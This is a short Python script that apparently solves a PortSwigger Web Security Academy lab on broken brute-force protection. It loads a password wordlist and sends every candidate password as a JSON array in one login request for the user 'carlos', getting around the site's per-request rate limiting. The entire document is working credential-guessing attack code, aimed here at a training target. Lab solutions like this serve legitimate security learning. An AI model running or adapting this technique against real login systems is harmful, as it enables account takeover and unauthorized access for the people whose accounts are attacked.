#Broken brute-force protection, multiple credentials per request
#To block your IP address when you make too many requests within a short period of time
#Solution: Passing all the password credentials within one request (Username must be valid one)

import requests
import json
url = "https://0adf00b4031d4cdfc0ff73da00e900c5.web-security-academy.net/login"
fd = open("/home/tester13/Documents/CTF/Portswigger/Authentication/pass.txt","r")
passwords = fd.read()
fd.close()
password_list = list(passwords.split('\n'))

# Making a single request with all the password credentials
data = {
    "username":"carlos",
    "password":password_list
}
r = requests.post(url,data=json.dumps(data))
if "too many" not in r.text:
    print(r.text)